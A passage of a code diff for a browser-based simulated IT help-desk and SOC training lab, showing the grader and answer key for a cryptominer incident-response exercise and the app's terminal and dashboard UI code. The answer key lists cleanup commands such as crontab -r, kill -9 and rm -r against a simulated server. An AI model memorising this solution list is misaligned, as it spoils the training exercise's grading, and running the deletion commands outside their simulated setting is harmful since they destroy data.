+  else{if(!/kworkerd/i.test(n.c))p.push('Your incident note should name the malicious process (kworkerd).');if(!n.c.includes('198.51.100.66'))p.push('Your incident note should include the malicious IP 198.51.100.66.');}
+  if(!wc.includes('cleanup-sessions.php'))notes.push('Note: the legitimate session cleanup job in www-data\'s crontab is gone too (crontab -r removes everything). In production you would put it back.');
+  return {problems:p,notes};},
+ resume:'Hands-on lab (simulated incident response): contained a cryptominer on a Linux web server by identifying the process with ps/top and ss, removing cron-based persistence from a service account, killing the process, deleting the payload, and documenting the incident.',
+ learned:`<p><b>ps aux</b> and <b>top</b> find the CPU hog; the USER and COMMAND columns tell you who runs it and from where. Malware loves hidden folders like <code>/tmp/.x</code>.</p><p><b>Persistence</b> is how malware survives a kill or reboot. Cron is a favorite: check every user's crontab with <code>crontab -u USER -l</code>, plus /etc/crontab and /etc/cron.d on real systems.</p><p>Order matters: remove persistence, then kill, then delete the files. Otherwise it respawns, as you may have seen.</p><p>Document everything (what, when, PID, IP). A web account running a miner also means the web app was probably exploited, so escalate to find the entry point.</p>`,
+ solve:['ps aux','sudo ss -tlnp','ls -la /tmp','crontab -l','sudo crontab -u www-data -l','sudo crontab -u www-data -r','sudo kill -9 3317','sudo rm -r /tmp/.x','echo "SOC-2088: killed kworkerd PID 3317 (www-data), C2 198.51.100.66, removed www-data cron persistence, deleted /tmp/.x" > ~/incident-SOC-2088.txt','cat ~/incident-SOC-2088.txt']});
+/* ===== UI ===== */
+const $=id=>document.getElementById(id);
+const PKEY='wfcLabs.progress.v1',SKEY='wfcLabs.state.v1.';
+function store(){try{return window.localStorage;}catch(e){return null;}}
+function loadProg(){try{const p=JSON.parse(store().getItem(PKEY));if(p&&p.done)return p;}catch(e){}return {done:{},hints:{}};}
+function saveProg(){try{store().setItem(PKEY,JSON.stringify(prog));}catch(e){}}
+let prog=loadProg(),cur=null,S=null,hi=-1,hIdx=0,hDraft='';
+const esc=s=>String(s).replace(/[&<>"]/g,ch=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[ch]));
+function renderDash(){const n=Object.keys(prog.done).length;$('progText').textContent=n+' of '+LABS.length+' labs complete';$('progBar').style.width=(n/LABS.length*100)+'%';
+  $('badges').innerHTML=LABS.map(L=>'<span class="bdg'+(prog.done[L.id]?' on':'')+'" title="Lab '+L.id+(prog.done[L.id]?' complete':'')+'">'+(prog.done[L.id]?'\u2713':L.id)+'</span>').join('');
+  $('grid').innerHTML=LABS.map(L=>'<button class="ticket" data-lab="'+L.id+'"><div class="trow"><span>#'+L.tid+'</span><span><span class="tag '+L.cat+'">'+(L.cat==='soc'?'SOC':'Help Desk')+'</span> <span class="tag '+L.pri.toLowerCase()+'">'+L.pri+'</span></span></div>'+
+    '<div class="tt">'+L.id+'. '+esc(L.title)+'</div><div class="ts">'+esc(L.summary)+'</div><div class="trow"><span>'+esc(L.requester)+'</span><span class="status '+(prog.done[L.id]?'done">Completed':'todo">Open')+'</span></div></button>').join('');
+  const done=LABS.filter(L=>prog.done[L.id]);$('resumeList').innerHTML=done.map(L=>'<li>'+esc(L.resume)+'</li>').join('');$('resumeEmpty').hidden=!!done.length;$('copyResume').hidden=!done.length;}
+function saveState(){if(!cur)return;try{store().setItem(SKEY+cur.id,JSON.stringify(S));}catch(e){}}
+function loadState(L){try{const t=store().getItem(SKEY+L.id);if(t){const x=JSON.parse(t);if(x&&x.fs)return x;}}catch(e){}return L.setup();}
+function prompt(){const u=curUser(S);const home=homeOf(S,u);let p=S.cwd;if(p===home)p='~';else if(p.startsWith(home+'/'))p='~'+p.slice(home.length);return u+'@'+S.host+':'+p+(u==='root'?'#':'$');}
+function print(txt,cls){const d=document.createElement('div');if(cls)d.className=cls;d.textContent=txt;$('out').appendChild(d);}
+function scrollOut(){const o=$('out');o.scrollTop=o.scrollHeight;}
+function welcome(){$('out').textContent='';print('Westside Family Clinic  |  '+S.host+'  |  Ubuntu 24.04 LTS (simulated)','i');print('Logged in as ricardo. Type help to list commands. Admin tasks need sudo.','i');print('');$('prompt').textContent=prompt();}
+function openLab(id,push){const L=LABS.find(x=>x.id===id);if(!L)return showDash();cur=L;S=loadState(L);hi=-1;hIdx=prog.hints[id]||0;
+  $('dash').hidden=true;$('lab').hidden=false;$('labTid').textContent='#'+L.tid+'  |  '+(L.cat==='soc'?'SOC':'Help Desk')+'  |  '+L.pri;$('labTitle').textContent=L.id+'. '+L.title;$('termTitle').textContent='ricardo@'+L.host;
+  $('answer').hidden=!L.answer;if(L.answer){const a=S.answers||{};$('ansIp').value=a.ip||'';$('ansUser').value=a.user||'';$('ansOk').value=a.ok||'';}
+  showBrief();renderDone(false);welcome();window.scrollTo(0,0);if(push!==false&&location.hash!=='#lab-'+id)history.pushState(null,'','#lab-'+id);
+  if(window.matchMedia('(min-width:861px)').matches)$('cmd').focus();}
+function showDash(push){cur=null;$('lab').hidden=true;$('dash').hidden=false;renderDash();if(push!==false&&location.hash)history.pushState(null,'',location.pathname+location.search);window.scrollTo(0,0);}
+function showBrief(){$('panel').innerHTML='<h3>Briefing</h3>'+cur.brief+'<p class="muted" style="font-size:13px">Buttons: Hint reveals one clue at a time, Check grades your work, Reset restores this server to its starting state.</p>';}
+function showHints(){let h='<h3>Hints ('+hIdx+' of '+cur.hints.length+' shown)</h3><div class="msg-hint">';
+  h+=cur.hints.slice(0,hIdx).map((x,i)=>'<p><b>Hint '+(i+1)+':</b> '+x+'</p>').join('');h+='</div>';if(hIdx>=cur.hints.length)h+='<p class="muted">That is every hint. You have got this.</p>';else h+='<p class="muted">Press Hint again for the next clue.</p>';$('panel').innerHTML=h;}
+function answers(){return {ip:$('ansIp').value,user:$('ansUser').value,ok:$('ansOk').value};}
+function doCheck(){if(cur.answer){S.answers=answers();saveState();}const r=cur.check(S,S.answers);
+  if(!r.problems.length){const first=!prog.done[cur.id];if(first){const d=new Date();prog.done[cur.id]=d.getFullYear()+'-'+String(d.getMonth()+1).padStart(2,'0')+'-'+String(d.getDate()).padStart(2,'0');saveProg();}
+    $('panel').innerHTML='<div class="msg-ok"><p class="pass">PASS</p><p>Ticket #'+cur.tid+' resolved. '+(first?'Badge earned!':'Still passing.')+'</p>'+(r.notes||[]).map(n=>'<p class="muted">'+esc(n)+'</p>').join('')+'</div>';renderDone(true);}
+  else $('panel').innerHTML='<div class="msg-bad"><p class="fail">NOT YET</p><p>'+r.problems.length+' thing'+(r.problems.length>1?'s':'')+' still wrong:</p><ul>'+r.problems.map(x=>'<li>'+esc(x)+'</li>').join('')+'</ul><p class="muted">Fix these in the terminal, then press Check again.</p></div>';}
+function renderDone(scroll){const d=$('done');if(!prog.done[cur.id]){d.hidden=true;return;}
+  d.innerHTML='<div style="display:flex;gap:12px;align-items:center"><div class="big" aria-hidden="true">\uD83C\uDFC5</div><div><h3 style="margin:0">Lab '+cur.id+' complete</h3><div class="muted" style="font-size:13px">Completed '+prog.done[cur.id]+'</div></div></div>'+
+   '<h3 style="margin-top:12px">Resume line</h3><div class="resline" id="resLine">'+esc(cur.resume)+'</div><button class="btn small" id="copyLine">Copy resume line</button>'+
+   '<h3 style="margin-top:14px">What you just learned</h3>'+cur.learned+'<p><button class="btn small" id="nextLab">'+(cur.id<LABS.length?'Next lab':'Back to dashboard')+'</button></p>';
+  d.hidden=false;$('copyLine').onclick=()=>copy(cur.resume,$('copyLine'));$('nextLab').onclick=()=>cur.id<LABS.length?openLab(cur.id+1):showDash();if(scroll)setTimeout(()=>d.scrollIntoView({behavior:'smooth',block:'nearest'}),50);}
+function copy(t,btn){const ok=()=>{const o=btn.textContent;btn.textContent='Copied';setTimeout(()=>btn.textContent=o,1500);};
+  if(navigator.clipboard&&window.isSecureContext)navigator.clipboard.writeText(t).then(ok,()=>fallback());else fallback();
+  function fallback(){const ta=document.createElement('textarea');ta.value=t;document.body.appendChild(ta);ta.select();try{document.execCommand('copy');ok();}catch(e){}ta.remove();}}
+let resetArm=0;
+function doReset(){const b=$('bReset');if(Date.now()-resetArm>3000){resetArm=Date.now();b.textContent='Tap again';setTimeout(()=>{b.textContent='Reset';},3000);return;}
+  resetArm=0;b.textContent='Reset';try{store().removeItem(SKEY+cur.id);}catch(e){}S=cur.setup();hIdx=0;prog.hints[cur.id]=0;saveProg();
+  if(cur.answer){$('ansIp').value='';$('ansUser').value='';$('ansOk').value='';}welcome();print('Server reset to its starting state.','i');$('panel').innerHTML='<p>Lab reset. Everything is back to how the ticket started. Your completion badge (if any) is kept.</p>';}
+function runCmd(line){print(prompt()+' '+line,'c');if(line.trim()){S.hist.push(line);if(S.hist.length>200)S.hist.shift();}hi=-1;
+  if(line.trim()){const r=runLine(S,line);if(r.clear)$('out').textContent='';r.lines.forEach(x=>print(x[1],x[0]==='e'?'e':x[0]==='i'?'i':''));
+    if(r.action&&r.action.type==='edit')openEditor(r.action);if(cur.tick)cur.tick(S);saveState();}
+  $('prompt').textContent=prompt();scrollOut();}
+let editAct=null;
+function openEditor(a){editAct=a;$('mFile').textContent=a.path;$('mText').value=a.content;$('modal').hidden=false;setTimeout(()=>$('mText').focus(),30);}
+function closeEditor(saved){if(!editAct)return;if(saved){const m=saveEdit(S,editAct,$('mText').value);print(m,m.startsWith('edit:')?'e':'i');saveState();}else print('Edit cancelled. Nothing was saved.','i');
+  editAct=null;$('modal').hidden=true;$('prompt').textContent=prompt();scrollOut();$('cmd').focus();}
+function histMove(d){if(!S.hist.length)return;if(hi===-1){hDraft=$('cmd').value;hi=S.hist.length;}hi=Math.max(0,Math.min(S.hist.length,hi+d));$('cmd').value=hi===S.hist.length?hDraft:S.hist[hi];if(hi===S.hist.length)hi=-1;}
+function doTab(){const inp=$('cmd');const r=complete(S,inp.value);if(typeof r==='string')inp.value=r;else if(r&&r.list){print(prompt()+' '+inp.value,'c');print(r.list.join('  '));scrollOut();}}
+function init(){renderDash();
+  $('grid').addEventListener('click',e=>{const b=e.target.closest('[data-lab]');if(b)openLab(+b.dataset.lab);});
+  $('backBtn').onclick=()=>showDash();$('bBrief').onclick=showBrief;$('bCheck').onclick=doCheck;$('bReset').onclick=doReset;
+  $('bHint').onclick=()=>{if(hIdx<cur.hints.length)hIdx++;prog.hints[cur.id]=hIdx;saveProg();showHints();};
+  $('cmd').addEventListener('keydown',e=>{if(e.key==='Enter'){e.preventDefault();const v=$('cmd').value;$('cmd').value='';runCmd(v);}
+    else if(e.key==='ArrowUp'){e.preventDefault();histMove(-1);}else if(e.key==='ArrowDown'){e.preventDefault();histMove(1);}
+    else if(e.key==='Tab'){e.preventDefault();doTab();}
+    else if(e.key==='l'&&e.ctrlKey){e.preventDefault();$('out').textContent='';}
+    else if(e.key==='c'&&e.ctrlKey&&!window.getSelection().toString()){e.preventDefault();print(prompt()+' '+$('cmd').value+'^C','c');$('cmd').value='';scrollOut();}});
+  $('keys').addEventListener('click',e=>{const k=e.target.dataset.k;if(!k)return;const inp=$('cmd');
+    if(k==='up')histMove(-1);else if(k==='down')histMove(1);else if(k==='tab')doTab();else if(k==='clear')runCmd('clear');else if(k==='sudo'){if(!inp.value.startsWith('sudo '))inp.value='sudo '+inp.value;}else if(k==='pipe')inp.value+=' | ';inp.focus();});
+  $('term').addEventListener('click',e=>{if(e.target.id==='out'&&!window.getSelection().toString())$('cmd').focus();});
+  $('mSave').onclick=()=>closeEditor(true);$('mCancel').onclick=()=>closeEditor(false);
+  $('mText').addEventListener('keydown',e=>{if(e.key==='Escape')closeEditor(false);if(e.key==='s'&&(e.ctrlKey||e.metaKey)){e.preventDefault();closeEditor(true);}
+    if(e.key==='Tab'){e.preventDefault();const t=e.target,s=t.selectionStart;t.value=t.value.slice(0,s)+'    '+t.value.slice(t.selectionEnd);t.selectionStart=t.selectionEnd=s+4;}});
+  $('copyResume').onclick=()=>copy(LABS.filter(L=>prog.done[L.id]).map(L=>'- '+L.resume).join('\n'),$('copyResume'));
+  let allArm=0;$('resetAll').onclick=()=>{const b=$('resetAll');if(Date.now()-allArm>3000){allArm=Date.now();b.textContent='Tap again to erase all progress';setTimeout(()=>b.textContent='Reset all progress',3000);return;}
+    prog={done:{},hints:{}};saveProg();LABS.forEach(L=>{try{store().removeItem(SKEY+L.id);}catch(e){}});b.textContent='Reset all progress';renderDash();};
+  window.addEventListener('popstate',route);route();}
+function route(){const m=location.hash.match(/^#lab-(\d+)$/);if(m)openLab(+m[1],false);else showDash(false);}
+init();
+</script>
+</body></html>
